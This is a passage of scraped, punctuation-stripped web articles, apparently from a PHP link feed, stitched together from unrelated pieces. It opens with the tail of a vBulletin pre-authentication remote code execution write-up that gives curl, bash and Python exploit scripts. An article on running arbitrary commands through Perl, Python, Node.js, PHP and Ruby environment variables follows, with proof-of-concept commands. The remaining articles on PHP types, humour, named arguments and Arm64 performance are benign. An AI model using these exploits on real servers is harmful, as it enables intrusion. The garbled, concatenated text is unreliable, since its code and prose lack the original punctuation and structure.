ugly nt used lightly making feature widely available template uglier private static template array public static function starttemplate template arraypush self template template public static function endtemplate arraypop self template private static function currenttemplate return end self template public static unit array px return div style solid red htmlspecialchars timername elapsed div public static function evalphp code allow php widget template prevents malicious user hacking something different template self currenttemplate widgetphp return obstart eval code output obgetcontents obendclean return output diff ur class intended allow runtime know template rendering ugly nt used lightly making feature widely available template uglier private static template array public static function starttemplate template arraypush self template template public static function endtemplate arraypop self template private static function currenttemplate return end self template public static unit array px return div style solid red htmlspecialchars timername elapsed div public static function evalphp code allow php widget template prevents malicious user hacking something different template self currenttemplate widgetphp return obstart eval code output obgetcontents obendclean return output portion added layer redundancy attempt prevent non widgetphp template loading eval code based comment code attempt prevent user modifying template incorrectly call evalphp without embedded php widget problem ahead problem arises vbulletin template system structured specifically template actually written php instead written language first processed template engine output string php code later ran eval rendering process template also standalone item nested within template one template number child template embedded within example take following template template name widgetphp templatetype template date username vbulletin version alpha cdata vb condition empty widgetconfig empty widgetinstanceid vb data widgetconfig widget fetchconfig vb raw widgetinstanceid vb vb condition empty widgetconfig vb set widgetid vb raw widgetconfigwidgetid vb set widgetinstanceid vb raw widgetconfigwidgetinstanceid vb div class bmodule vb var widgetconfigshowatbreakpointscssclasses canvaswidget defaultwidget customhtmlwidget id widget vb raw widgetinstanceid datawidgetid vb raw widgetid datawidgetinstanceid vb raw widgetinstanceid vb template moduletitle widgetconfig vb raw widgetconfig canusesitebuilder vb raw usercanusesitebuilder div class widgetcontent vb condition empty widgetconfig code vboptions disablephprendering vb comment eval anything widgetconfig code anything else could potentially come malicious user use phpeval outside template ever vb comment vb phpeval vb raw widgetconfigcode vb else vb condition user canusesitebuilder span class note vb phrase clickedittoconfigmodule span vb vb div div template template name widgetphp templatetype template date username vbulletin version alpha cdata vb condition empty widgetconfig empty widgetinstanceid vb data widgetconfig widget fetchconfig vb raw widgetinstanceid vb vb condition empty widgetconfig vb set widgetid vb raw widgetconfigwidgetid vb set widgetinstanceid vb raw widgetconfigwidgetinstanceid vb div class bmodule vb var widgetconfigshowatbreakpointscssclasses canvaswidget defaultwidget customhtmlwidget id widget vb raw widgetinstanceid datawidgetid vb raw widgetid datawidgetinstanceid vb raw widgetinstanceid vb template moduletitle widgetconfig vb raw widgetconfig canusesitebuilder vb raw usercanusesitebuilder div class widgetcontent vb condition empty widgetconfig code vboptions disablephprendering vb comment eval anything widgetconfig code anything else could potentially come malicious user use phpeval outside template ever vb comment vb phpeval vb raw widgetconfigcode vb else vb condition user canusesitebuilder span class note vb phrase clickedittoconfigmodule span vb vb div div template template would rendered following php code finalrendered empty widgetconfig empty widgetinstanceid finalrendered rnt widgetconfig parsedata widget fetchconfig widgetinstanceid finalrendered rn ntttt else finalrendered finalrendered rnrn empty widgetconfig finalrendered rnt widgetid widgetconfig widgetid finalrendered rnt widgetinstanceid widgetconfig widgetinstanceid finalrendered rn ntttt else finalrendered finalrendered rnrn div class bmodule vbvar widgetconfig showatbreakpointscssclasses canvaswidget defaultwidget customhtmlwidget id widget widgetinstanceid datawidgetid widgetid datawidgetinstanceid widgetinstanceid rnrnt includetemplate moduletitle array widgetconfig widgetconfig showtitledivider canusesitebuilder user canusesitebuilder rnrnt div class widgetcontent rntt empty widgetconfig code vb getdatastore getoption disablephprendering finalrendered rnttt rnttt evalphp widgetconfig code rntt else finalrendered rnttt user canusesitebuilder finalrendered rntttt span class note parsephrase clickedittoconfigmodule span rnttt else finalrendered finalrendered rntt finalrendered rnt div rn div finalrendered empty widgetconfig empty widgetinstanceid finalrendered rnt widgetconfig parsedata widget fetchconfig widgetinstanceid finalrendered rn ntttt else finalrendered finalrendered rnrn empty widgetconfig finalrendered rnt widgetid widgetconfig widgetid finalrendered rnt widgetinstanceid widgetconfig widgetinstanceid finalrendered rn ntttt else finalrendered finalrendered rnrn div class bmodule vbvar widgetconfig showatbreakpointscssclasses canvaswidget defaultwidget customhtmlwidget id widget widgetinstanceid datawidgetid widgetid datawidgetinstanceid widgetinstanceid rnrnt includetemplate moduletitle array widgetconfig widgetconfig showtitledivider canusesitebuilder user canusesitebuilder rnrnt div class widgetcontent rntt empty widgetconfig code vb getdatastore getoption disablephprendering finalrendered rnttt rnttt evalphp widgetconfig code rntt else finalrendered rnttt user canusesitebuilder finalrendered rntttt span class note parsephrase clickedittoconfigmodule span rnttt else finalrendered finalrendered rntt finalrendered rnt div rn div rendered code later pushed eval process portion child template loaded also ran eval type system may seem innocuous untrained eye approach open number issue beyond insecure us eval call regardless way fail nonfiltered modification output variable open code another code executionconstant filtering required template code situation create nonescaped phpxss filtering nightmaresincluded child code access parent declared variable think many situation would optimal approach however keep analysis point focus issue leading bypass bypassing patch code mentioned one previous section may seem thorough approach actually somewhat short sighted specifically patch face issue encountering user controlled child template parent template checked verify routestring end widgetphp route however still prevented providing payload within widgetconfig value code within rendering process clean widgetconfig value prior template execution problem remedied u lucky solution manifesting following template template name widgettabbedcontainertabpanel templatetype template date username vbulletin version alpha cdata vb set panelid vb concat vb var idprefix vb var tabnum div id vb var panelid class hclearfix jsshowontabscreate hhide vb comment vb var panelid vb subwidgets value subwidget nbsp nbsp vb raw subwidgettemplate vb vb comment vb subwidgets value subwidget vb template vb raw subwidgettemplate widgetconfig vb raw subwidgetconfig widgetinstanceid vb raw subwidgetwidgetinstanceid widgettitle vb raw subwidgettitle tabbedcontainersubmodules vb raw subwidgettabbedcontainersubmodules product vb raw subwidgetproduct vb div template template name widgettabbedcontainertabpanel templatetype template date username vbulletin version alpha cdata vb set panelid vb concat vb var idprefix vb var tabnum div id vb var panelid class hclearfix jsshowontabscreate hhide vb comment vb var panelid vb subwidgets value subwidget nbsp nbsp vb raw subwidgettemplate vb vb comment vb subwidgets value subwidget vb template vb raw subwidgettemplate widgetconfig vb raw subwidgetconfig widgetinstanceid vb raw subwidgetwidgetinstanceid widgettitle vb raw subwidgettitle tabbedcontainersubmodules vb raw subwidgettabbedcontainersubmodules product vb raw subwidgetproduct vb div template template widgettabbedcontainertabpanel displayed perfect assistant bypassing previous patch two key feature template ability load user controlled child templatethe template load child template taking value separately named value placing variable named widgetconfig two characteristic widgettabbedcontainertabpanel template allow u effectively bypass filtering previously done prevent exploited poc vulnerability simplicity creating one line command line exploit simple following curl http examplecomajaxrenderwidgettabbedcontainertabpanel subwidgets template widgetphp subwidgets config code phpinfo curl http examplecomajaxrenderwidgettabbedcontainertabpanel subwidgets template widgetphp subwidgets config code phpinfo full exploit list full exploit payload written multiple different language including bash python ruby bash exploit binbash vbulletin widgettabbedcontainertabpanel zenofex br usage exploit site shellcommand br urlencode cmd cmd echo muri escape ne chomp print uriescape n send request curl subwidgets template widgetphp subwidgets config code echo cmd exit binbash vbulletin widgettabbedcontainertabpanel zenofex br usage exploit site shellcommand br urlencode cmd cmd echo muri escape ne chomp print uriescape n send request curl subwidgets template widgetphp subwidgets config code echo cmd exit python exploit usrbinenv vbulletin preauth widgettabbedcontainer rce exploit zenofex import argparse import request import sys def runexploit vbloc shellcmd postdata subwidgets template widgetphp subwidgets config code echo shellexec exit shellcmd r requestspost sajaxrenderwidgettabbedcontainertabpanel vbloc postdata return rtext ap argparseargumentparser descriptionvbulletin ajax widget template rce apaddargument l location requiredtrue helpweb address root install args apparseargs true try cmd input print runexploit argslocation cmd except keyboardinterrupt sysexit nclosing shell except exception e sysexit str e usrbinenv vbulletin preauth widgettabbedcontainer rce exploit zenofex import argparse import request import sys def runexploit vbloc shellcmd postdata subwidgets template widgetphp subwidgets config code echo shellexec exit shellcmd r requestspost sajaxrenderwidgettabbedcontainertabpanel vbloc postdata return rtext ap argparseargumentparser descriptionvbulletin ajax widget template rce apaddargument l location requiredtrue helpweb address root install args apparseargs true try cmd input print runexploit argslocation cmd except keyboardinterrupt sysexit nclosing shell except exception e sysexit str e metasploit module also process pushing public metasploit module metasploitframework project pull request found slide also published slide exploiting vbulletin tale patch fail short term fix fix disable php widget within forum may break functionality keep safe attack patch released vbulletin go vbulletin administrator control panelclick setting menu left option dropdownchoose general setting click edit setting look disable php static html ad module rendering set yes click save godspeed happy defcon safe mode
30,Lobsters,php,PHP programming,Everything you need (and don't need) to know about PHP's type system,https://thephp.website/en/issue/php-type-system/,everything need nt need know php type system,everything need nt need know php type system leia em português php dynamically typed scripting language scalar type declaration return type declaration type hinting analyzed statically still support dynamic type type mismatch reach twitter aahh like kind content certainly enjoy post time compiler work open another tab check later wo nt regret kind type php gettype vardump scalar type compound type special type scalar type main takeaway scalar value behaviour state represent value compound type one four compound type carry different syntactic capability array compound type key value feel free ping like hear specific function manipulate internal pointer main takeaway array extremely flexible compound type perceived hashmap also considered iterable type object compound type main takeaway object normally lower memory profile array carry state behaviour created casting array callable compound type calluserfunc call private protected method inside class scope invoke magic method main takeaway callables hold reference function method constructed different way iterable compound type traversable interface foreach loop yield statement spread operator main takeaway fit foreach iterable special type ca nt cast type resource null resource represents handle external resource null type represents null value main takeaway special typed value ca nt casted anything class instance gettype vardump getclass type operation php type juggling type casting coercion type conversion type cast manually explicitly type coercion implicitly type casting meaning cast scalar compound type php casting object scalar type completely valid also possible cast value type main takeaway php allows cast scalar type array object class casting allowed type coercion type coercion happens sideeffect working mismatched undeclared type main takeaway php mechanism normalize type runtime implicitly always watch type hinting since php also possible typehint class property function body always trust integer expected integer depend function caller nt mean php statically typed strict type switched main takeaway type hinting give mere hint type engine order strict typing choice bring small overhead union type pseudotype exists readability purpose nullable type php come proper union type feature php type juggling php support explicit type definition variable declaration snippet php source code may return integer float simply take granted type juggling happen automatically boolean conversion return false original value return true everything else converting boolean section manual also found language manual important note using stricttypes union type follow rule php type mode already realized two way php handle type coercive type mode strict type mode juggling guessing still happens explicitly defined type set typeerrors thrown type mismatch happen strlen logic php source code main takeaway strict type wo nt make code faster closing thought main takeaway took incredible amount time write article like show kind support please share social medium social circle,everything need nt need know php type system leia em português php dynamically typed scripting language year php support statically declared type one could cast scalar type explicitly code declaring scalar type method function signature nt thing php scalar type declaration return type declaration rfcs nt mean version php became statically typed language though type hinting analyzed statically still support dynamic type even allows mixed see example php function returnsint int return doubt type mismatch return type supposed int returned type fact string php automatically transform token integer order return required type even though seems extra cost nt php type juggling nearly costfree many case better clarify language deal type split article following section suggestion add feel free reach twitter opening issue github aahh like kind content certainly enjoy post time compiler work open another tab check later wo nt regret kind type php php type system simplified come language feature example char type unsigned type even char type simplified string type integer variation simplified integer type whether good bad thing one always inspect variable type using gettype function using vardump function checking output php come three different kind type scalar type compound type special type scalar type scalar type bare bone language four boolean bool boolean integer int integer float float double string string definition scalar type carry behaviour state expression like tostring thephpwebsite length invalid main takeaway scalar value behaviour state represent value compound type compound type much interesting even though similar scalar type one four compound type carry different syntactic capability four compound type array compound type array fact hashmap builtin language meaning store value key value manner even use purely vector array flexible structure come size internal type keyvalue mapping example valid array php vec vec int map b map int mapish mapish int mapish int unlike c php wo nt require define array size creating course come memory consumption cost bigger array size memory consume crazy proportion fact array allocated power two consumption work scope article feel free ping like hear case curious statement video present chart insight array v object memory profile videovideo see bellow array also considered type iterable meaning iterate using foreach loop also provide specific function manipulate internal pointer main takeaway array extremely flexible compound type perceived hashmap also considered iterable type object compound type due php architecture object compound type normally much lower memory consumption profile compared array normally one would use object type creating instance class object carry state behaviour meaning php offer dereferencing language structs access object internals snippet illustrates php object derefs php class myclass private const public int property public function method void obj new myclass obj object myclass obj int obj property int obj method null object also normally created result type cast array transforming array key object property name cast always result object stdclass type php obj object obj object stdclass obj int important notice casting array numeric key object valid one ca nt dereference value property name may start number php obj object legal obj illegal main takeaway object normally lower memory profile array carry state behaviour created casting array callable compound type callable php anything called oh nt say parenthesis calluserfunc function word callable fulfil responsibility know function function method always callables object class may also become callables callable definition reference stored variable like following php callable strlen string well yes coerced callable necessary like php function callacallable callable f int return f thephpwebsite callable strlen vardump callable thephpwebsite int vardump callacallable callable int callables may also point object method php class myclass public function mymethod int return obj new myclass vardump obj mymethod int look odd know look like array fact unless name callable kind callable objectmethod reference interesting call private protected method inside class scope otherwise may call public method also class implement invoke magic method automatically transform instance callables like following php class mycallableclass public function invoke int return obj new mycallableclass vardump obj int main takeaway callables hold reference function method constructed different way iterable compound type iterables simpler explain definition array instance traversable interface main thing iterable used foreach loop yield statement spread operator example iterables php function generatorfunction generator variable iterables b generatorfunction c new arrayobject main takeaway fit foreach iterable special type two special type biggest reason called special ca nt cast type special type resource type null type resource represents handle external resource file handle io stream database connection handle may guess ca nt convert resource type null type represents null value meaning variable holding null initialized assigned null unset runtime main takeaway special typed value ca nt casted anything class instance class instance type object always presented like executing gettype object always return string object calling vardump object always print value using object classname notation need fetch object class string use getclass function php obj new stdclass echo gettype obj object vardump obj object stdclass echo getclass obj stdclass type operation php different operation one php come type believe important clearly state nt mix thing later type juggling type casting coercion dive three important definition need keep mind type conversion mean transform type b example integer float type cast mean manually explicitly convert type b hundred int float became int type coercion mean implicitly convert type b twenty banana string banana became int said following section explain happens php later find information type juggling type casting similar java php allows type casting meaning variable point value casted different type allows manual explicit type conversion wait wait given variable hundred holding string value may manually converted casted become int float scalar type one compound type array object following snippet work fine php similar java php hundred int hundred int one thing java completely illegal php code convert cast variable pointer different class meaning cast scalar compound type php php class myclass yield parse error illegal myclass new stdclass important notice type casting php allowed scalar type meaning casting object different class instance illegal casting object scalar type completely valid also possible cast value array object type nt considered scalar type compound type naming really tough huh php class myclass obj new myclass one int obj int code generates notice still valid later explain int value came main takeaway php allows cast scalar type array object class casting allowed type coercion type coercion happens sideeffect working mismatched undeclared type explained depth later article know php automatically cast type code runtime necessary example type coercion multiplying integer float number expression int multiplied float result float value php vardump float main takeaway php mechanism normalize type runtime implicitly always watch type hinting type hinting coercion enforcement strict typing mechanism introduced php language version affect function method signature since php also possible typehint class property example type hint php function sum int int b int return b hint say variable naturally coerced type int variable b naturally coerced type int result function naturally coerced type int notice used naturally coerced php wo nt complain call function noninteger value fact attempt implicitly convert coerce parameter integer nt already function body always trust b integer expected integer depend function caller php function sum int int b int int b int return b sum apple banana also possible use php directive named stricttypes avoid coercion simply raise error type mismatch occurs like following php declare function sum int int b int return b sum banana apple php fatal error uncaught typeerror argument passed sum must type int string given nt mean php statically typed strict type switched fact type hinting add processing overhead php engine internally always perform type juggling wo nt ever trust variable type hint type hint serve two purpose define type value coerced raise fatal error strict type switched main takeaway type hinting give mere hint type engine order strict typing choice bring small overhead union type move type juggling like quickly talk union type seems make sense besides three type php scalar compound special php manual also mention pseudotype exists readability purpose type nt really exist convention want pay attention one specific pseudotype arrayobject pseudotype often used documentation specify parameter return type iterable type also kindof union type defined arraytraversable since php language added kindof support union type introducing nullable type really think nullable type union tnull example int mean intnull bet never thought many unknown union type php come proper union type feature define union need without depend pseudotypes convention work like php declare function divide int int b intfloat return b function may return integer float never anything else php type juggling probably nt first time heard term type juggling one important core feature php offer yet one least understood one ca nt blame people knowing called juggling reason many variation variable type context become quite cumbersome understand type dealing let start following statement php support explicit type definition variable declaration powerful whenever declare variable php infer type contain based assignment var creates variable null value one creates integer obj new stdclass creates object stdclass type definition php try best guess type attributed variable php variable dynamic point may change type runtime without trouble code valid php var var null var var int var thephpwebsite var string thephpwebsite var new stdclass var object stdclass variable dynamic many operation php require engine check value based operation context expression like sum b internally check first operand type later guess second operand type take look snippet php source code long integer check long b integer perform long sum otherwise check double perform double sum yes expression may return integer float simply take granted type juggling happen automatically also mean type coercion implicit cast also happen automatically nt supposed surprise specific moment type coercion may occur type coercion therefore juggling may occur resolving expression passing argument function method returning function method might thinking well coercion everywhere php handle incompatible type converting integer boolean seems ok array integer sound bit awkward already well php well defined rule type casting first thing necessary understand resulting type supposed later evaluate casting example expression occurs inside statement quickly realize expression yield boolean value php var var int var treated bool evaluates true var var still int var still int notice var int entire lifetime got treated bool true inside statement statement expects expression evaluates boolean result type juggling exactly php hood illustrate go decision tree converting type boolean boolean conversion return false original value bool false int int float float empty string zero string empty array null simplexml instance created empty tag return true everything else table found converting boolean section manual complete documentation type comparison conversion table also found language manual nt courage read part job make available important note php union type introduced language bringing extra layer complexity type juggling dealing union type must follow precedence precedence welldefined instead based type order using stricttypes union type follow rule union type nt contain subject type may coerce value following order precedence int float string bool example php function f intstring v void vardump v f string union type string f int union type f float nt union type int f array nt union type uncaught typeerror f argument v must type stringint example something interesting happens array type wo nt converted bool false raise typeerror instead php type mode already realized two way php handle type one way called coercive type mode juggling guessing game happening way strict type mode juggling guessing still happens explicitly defined type set typeerrors thrown type mismatch happen see common thing php developer expect engine respect law equivalent exchange 等価交換法 pay effort strictly typing everything performance boost finally able bypass type check perform operation right away see reason someone might think way must tell completely wrong let check following strlen logic php source code every time need check whether using strict mode get boolean value exusesstricttypes true strict mode false coercive mode check snippet start like zval value value bpvarr value parameter strlen expected ztypep value isstring zvallong exvar opline resultvar zstrlenp value zendvmnextopcode else see first statement guess exactly check parameter type know snippet type hint nothing else clause hold interesting stuff might use strict type else look promising zendbool strict isvariscv ztypep value isreference strict exusesstricttypes expected strict zendinternaltypeerror strict zvalnull exvar opline resultvar snippet see example strict mode nt cut processing fact creates couple extra check single purpose raise fatal error saying bad implementation personally happy think important make clear wo nt affect performance positively main takeaway strict type wo nt make code faster closing thought article big quest seriously thinking writing book page alone would make goodsized book already hope information collected useful least interesting believe php type system incredibly rich carry many innovative legacy feature make much sense look history language development usual feel free ping twitter anything say open issue pull request happy main takeaway took incredible amount time write article like show kind support please share social medium social circle see next time cheer
31,Lobsters,php,PHP programming,Hacking with Environment Variables,https://www.elttam.com/blog/env/,hacking environment variable,introduction remote ldpreload exploitation perl exploit hacker fantastic blasty exploit solve ctf challenge justinsteven proof concept python making progress pythonwarnings guarded check variable antigravity module easter egg leveraging perl arbitrary code execution proof concept nodejs blog post michał bentkowski proc filesystem proof concept php php setting orange tsai great blog post brendan scarvell proof concept ruby proof concept conclusion,introduction recent project gained ability specify environment variable process executed also unable control content file disk bruteforcing process identifier pid file descriptor found interesting result eliminating remote ldpreload exploitation fortunately scripting language interpreter executed enabled u execute arbitrary command specifying particular environment variable blog post discus arbitrary command executed range scripting language interpreter supplied malicious environment variable perl quick read environment section perlrun man page reveals plenty environment variable worth investigating environment variable allows specifying commandline option restricted accepting option cdimtuwdmtw unfortunately mean e allows supplying perl code run lost though demonstrated exploit hacker fantastic exploit writes malicious perl module tmprootpm supply environment variable achieve arbitrary code execution however exploit local privilege escalation vulnerability generic technique ideally require access file system looking blasty exploit cve exploit require creating file used environment variable sh exit environment variable also used solve ctf challenge one final nicety generic technique would use single environment variable instead two justinsteven found possible leveraging either used load perl module option allows adding extra code module name proof concept arbitrary code execution achieved using environment variable perl running empty script devnull docker run env print id perl devnull root root root python reading environment variable section python man page pythonstartup initially appears like may piece straightforward solution allows specifying path python script executed prior displaying prompt interactive mode interactive mode requirement seem like would issue pythoninspect environment variable used enter interactive mode specifying command line however documentation option explains pythonstartup used python started script execute mean pythonstartup pythoninspect combined pythonstartup effect python repl immediately launched ultimately mean pythonstartup viable effect executing regular python script environment variable looked promising pythonhome pythonpath let gain arbitrary code execution require also able create directory file filesystem may possible loosen requirement use proc filesystem andor zip file majority remaining environment variable simply checked contain nonempty string toggle generally benign setting one rare exception pythonwarnings making progress pythonwarnings documentation pythonwarnings state equivalent specifying w option w option used warning control specify warning often printed full form argument action message category module line warning control seem like promising lead quickly changed checking implementation def getcategory category category return warning category import builtins klass category else module klass categoryrpartition try import module none none klass except importerror raise optionerror invalid module name r module none code show long specified category contains dot trigger import arbitrary python module next problem vast majority module python standard library run little code imported tend define class used later even provide code run code typically guarded check main variable detect file imported run directly unexpected exception antigravity module python developer included easter egg triggered running import antigravity import immediately open browser xkcd comic joked import antigravity python would grant ability fly antigravity module open browser us another module standard library called webbrowser module check path large variety browser including mosaic opera skipstone konqueror chrome chromium firefox link elinks lynx also accepts environment variable browser let specify process executed possible supply argument process environment variable xkcd comic url one hardcoded argument command ability turn arbitrary code execution depends executables available system leveraging perl arbitrary code execution one approach leverage perl commonly installed system even available standard python docker image however perl binary used first argument xkcd comic url comic url argument cause error process exit without environment variable used effect url passed perl docker run e print id exit perl http ca nt open perl script http file directory fortunately perl available also common default perl script available perldoc perlthanks script also error exit invalid argument error case happens later processing environment variable mean leverage perl environment variable payload detailed earlier blog post working intended perldoc perlthanks docker run e print id exit perldoc http root root root run e print id exit perlthanks http root root root proof concept arbitrary code execution achieved using multiple environment variable python python docker run e e browserperlthanks e print id exit python devnull root root root invalid w option ignored unknown warning category antigravityx docker run e e browserperlthanks e print id exit python devnull root root root invalid w option ignored unknown warning category antigravityx nodejs blog post michał bentkowski provided payload exploiting kibana prototype pollution vulnerability used set arbitrary environment variable resulted arbitrary command execution michał payload used nodeoptions environment variable proc filesystem specifically procselfenviron although michał technique creative worked perfectly vulnerability technique always guaranteed work constraint would nice remove first constraint using procselfenviron viable content made syntactically valid javascript requires able create environment variable appear first content procselfenviron knowingbruteforcing environment variable name appear first overwriting value another constraint first environment variable value finish single line comment therefore newline character environment variable likely cause syntax error prevent payload executing use multiline comment fix issue must closed syntactically valid therefore rare case environment variable contains newline character required knowbruteforce environment variable name overwrite value new value contain newline removing contraints exercise left reader proof concept achieving arbitrary code execution environment variable nodejs michał bentkowski docker run e nodeversionconsolelog require childprocess execsync id tostring e nodeoptions require procselfenviron node devnull root root root php run ltrace e getenv php devnull find php us phprc environment variable environment variable used attempting find load configuration file phpini exploit neex used series php setting achieve arbitrary code execution orange tsai also great blog post creating exploit cve us slightly different list setting using knowledge plus knowledge gained previous nodejs technique help brendan scarvell two environment variable solution found php constraint exist technique nodejs example proof concept achieving arbitrary code execution environment variable php docker run e nautoprependfileprocselfenvironn php die id e phprcprocselfenviron php devnull autoprependfileprocselfenviron root root root ruby generic solution ruby found yet ruby accept environment variable rubyopt specify commandline option man page state rubyopt contain e k r u v w w debug disablefeature enablefeature promising option r cause ruby load library using require however limited file extension rb example somewhat useful rb file found toolsserverrb json gem available installing ruby fedora system file required web server started shown using rubyopt environment variable cause ruby process start web server docker run env binbash c dnf install ruby devnull ruby devnull surf http info webrick info ruby info webrick httpserver start sticking fedora another approach leverage fact usrbinruby actually bash script start usrbinrubymri script call bash function overwritten environment variable proof concept using exported bash function run arbitrary command docker run env bashfuncdeclare id exit binbash c dnf install ruby devnull ruby devnull root root root conclusion post explored interesting use case environment variable could assist achieving arbitrary code execution various scripting language interpreter without writing file disk hopefully enjoyed reading inspired find share improved payload scripting language find generic technique work ruby would interested hearing achieved thanks reading ciao bella
32,Lobsters,php,PHP programming,If PHP Were British (2011),https://aloneonahill.com/blog/if-php-were-british/,php british,php british rasmus lerdorf php slap face getting started abbreviation eloquence biggerthancheeses spelling manner class sun never set thanks mark pat connexion php development humour empire comment powered disqus,php british rasmus lerdorf first put php together quite sensibly despite heritage chose write greenlandic danish good job would rather unpleasant work opted instead canada local tongue french canadian english either went bastard dialect queen english commonly referred u english php developer britain grumpy ever since thinking importantly undo travesty developer ensure tradition british empire continue upheld even digital age slap face variablename first maybe important many change allow php achieve elegant feel remove symbol beloved u replace something altogether refined solid sterling getting started php echo hello world many today british programmer put outset brazen informality simple yet obscenely americanised program colloquially referred hello world imperial formal introduction might encourage greater proportion young british talent remain language thus give broader community urbane air php announce good morrow fellow subject crown abbreviation thing abhorrent british unnecessary abbreviation text speak unheard street london natural ingrained british grammarian simply refuse stoop sending message c u soon traffic kthxbye variety instead proferring something altogether elegant dear sirmadam arrive soon time allows expect within hour assure horse shall spared respectfully slower type yes like rushed php hand full bursting abbreviation acronym entirely unnecessary strreplace isint vardump pregmatch jsonencode mysqlconnect following change improve thing stringreplace isinteger variabledump perlregularexpressionmatch javascriptobjectnotationencode mystructuredquerylanguageconnect edit corrected expansion pregmatch thanks pointed eloquence condition code else code shakespeare would ashamed see native tongue twisted monstrosity brevity applauded right context dark corner shall seldom seen else block used conditional code php must made inoffensive possible many option replacement may strongest perchance code otherwise code naturally applies americanised switch case construct one describe clunky unpleasant switch variable case code break case code break default code break word switch break default hard reader lack context right honourable biggerthancheeses kind enough contribute gentrified suggestion interesting idea particularly around replacement include something like imightbepartialto demonstrating natural talent imperialisation programming language whatabout perhaps code splendid perhaps code splendid ontheoffchance code splendid spelling imagecolorallocate serialize newtcenteredwindow connectionstatus word fail point selfrespecting gentleman expected make head tail word beggar belief anyone could allow distortion word entered programming language along cornucopia similar error reverted proper form immediately imagecolourallocate serialise newtcentredwindow connexionstatus manner try code catch exception e handle exception die message try catch block excellent example php lack manner far direct allowed new php additionally word die depressing new block although verbose vastly polite upbeat wouldyoumind code actuallyidomind exception politely move cheerio message class perhaps nothing important ingrained british psyche notion class opportunity change within part php change made important class republic public private b protected c example new republic begin current system place class hierarchy unacceptable shall begin giving class specific level upper middle working class access method one higher level without explicit permission higher order class course though might access would true member higher order could grant higher order access lower order class public private british class system often synonymous see example school system nomenclature must adjusted protected property visibility word new passable much appropriate replacement matter class upperclass empire state private hereditary nouveau empire sun never set hoped simple change improve reputation status php among language longer poor american cousin instead take rightful place british king scripting language thanks many thanks mark pat former colleague helped start resurrection british empire pub friday yes connexion august php development humour empire please enable javascript view comment powered disqus
33,Lobsters,php,PHP programming,Named arguments are coming in PHP 8,https://stitcher.io/blog/php-8-named-arguments,named argument coming php,php named argument close call php promoted property named argument counter argument named argument depth attribute rfc twitter email newsletter twitter pr,php named argument close call named argument also called named parameter supported php post discus in out let show first look like example wild setcookie name test expires time named argument used builtin php function class customerdata public function construct public string name public string email public int age data new customerdata name input name email input email age input age dto making use promoted property well named argument data new customerdata customerrequest validated named argument also support array spreading might guessed example named argument allow pas input data function based argument name instead argument order would argue named argument great feature significant impact daytoday programming life probably wondering detail though pas wrong name array spreading syntax well let look question indepth named argument let say feature highly debated one counter argument adding however say benefit far outweigh fear backwards compatibility problem bloated apis way see allow u write cleaner flexible code one named argument allow skip default value take look cookie example setcookie name test expires time method signature actually following setcookie string name string value int expires string path string domain bool secure false bool httponly false bool example showed nt need set cookie value need set expiration time named argument made method call little concise setcookie test time setcookie without named argument setcookie name test expires time setcookie named argument besides skipping argument default value also benefit clarity variable something especially useful function large method signature could say lot argument usually code smell still deal matter better sane way nothing named argument depth basic way let look named argument ca nt first named argument combined unnamed also called ordered argument case ordered argument must always come first take dto example class customerdata public function construct public string name public string email public int age could construct like data new customerdata input name age input age email input email however ordered argument named one would throw error data new customerdata age input age input name email input email next possible use array spreading combination named argument input age name brent email brent stitcherio data new customerdata input however missing required entry array key listed named argument error thrown input age name brent email brent stitcherio unknownproperty allowed data new customerdata input possible combine named ordered argument input array ordered argument follow rule must come first input brent age email brent stitcherio data new customerdata input using variadic function named argument passed key name variadic argument array take following example class customerdata public static function new args self return new self args public function construct public string name public string email public int age data customerdata new email brent stitcherio age name brent case args customerdata new contain following data age email brent stitcherio name brent attribute also known annotation also support named argument class productsubscriber listensto event productcreated class public function onproductcreated productcreated event possible variable argument name field age data customerdata new field finally named argument deal pragmatic way name change inheritance take example interface eventlistener public function event handler class mylistener implement eventlistener public function myevent myhandler php silently allow changing name event myevent handler myhandler decide use named argument using parent name result runtime error public function register eventlistener listener listener event event handler handler runtime error case listener instance mylistener pragmatic approach chosen prevent major breaking change inherited argument would keep name seems like good solution tell named argument want know little backstory behind design decision encourage read rfc looking forward using named argument let know via twitter via email would like stay date new content feel free subscribe newsletter follow twitter noticed tpyo submit pr fix
34,Lobsters,php,PHP programming,Improving performance of PHP for Arm64 and impact on Amazon EC2 M6g instances,https://idk.dev/improving-performance-of-php-for-arm64-and-impact-on-amazon-ec2-m6g-instances/,improving performance php impact amazon instance,better zend optimizer performance evaluation wordpress ubuntu install aws contribution patch impacting performance wordpress benchmark future development conclusion,post contributed sebastian pop senior software engineer amazon web servicesaws recently launched amazon instance powered compared similarsized instance instance provide better costperformance several opensource application stacksthis blog discus aws worked together php community drive major improvement performance php software stack instance using instance latest release currently experience faster execution time compared previous release significantly lower cost running php software wordpress amazon instancesa better zend optimizer optimizer component php runtime system improves performance range zend microbenchmarks php zend optimizer enabled arm aws added implementation several function php interpreteraws evaluated performance impact software change php interpreter running standard microbenchmarks distributed zend optimizer benchphp microbenchphp look performance php interpreter used fully loaded server benchmark set run many copy parallel vcpus system vcpu run one copy benchmark utilization system experiment run vcpus vcpus intel instance php version execution time instance improved following image demonstrate benchmark result first image show improved execution time zendbenchphp newer version php second image illustrates faster execution time newer version php zendmicrobenchphpperformance evaluation wordpress ubuntu synthetic benchmark proved superior performance also looked wordpress phpbased realworld application following image show setup experiment machine represented middle image system test sut measure performance php independently component system mysql database set run separate instance blue figure program wrk generates http request main page wordpress wrk run separate instance represented orange figure minimize network noise three machine allocated cluster placement group sut run nginx webserver php interpreter nginx webserver configured fast cgi interface phpfpm machine run ubuntu software change wordpress serve page per second v combined lower cost instance running wordpress provides better priceperformance instance v instance following image illustrates performance php version running instance looking scalability wordpressnginx benchmark instance better performing release adding vcpus scale almost linearly number served page eight vcpus however beta version august contains even optimization scalability trend continues vcpus cpu utilization drop lowcost end spectrum aws offer instance sustain page per second may interesting small costconscious user wordpresshow install instruction http wwwphpnetinstallinstallation instruction ubuntu http computingforgeekscomhowtoinstallphponubuntuaws contribution impacting performance wordpress benchmarkthe performance difference master due http remove support constructor deprecated http committed early branch cut patch may easily applied branch get performance benefit see masterthere two patch impact performance wordpressnginx benchmark applied master branch future plan release improvement improved touppertolower function brings performance http contributed change release version used match regular expression accounted execution time wordpress benchmark change contributed aws vectorizes first character match matching pair character neon instruction performance improves http plan feature new jit compiler optimizes php bytecode opcache jit currently developed based lua jit lua jit support work php developer enable tune opcache jit get best performance aws graviton processorsthe interaction php community early discussion maintainer php zend optimizer plan improve performance arm patch review improved quality submission followup patch community address problem uncovered review patch aws continues contribute arm performance improvement followed pattern involvement pcre community continue work opensource community bring 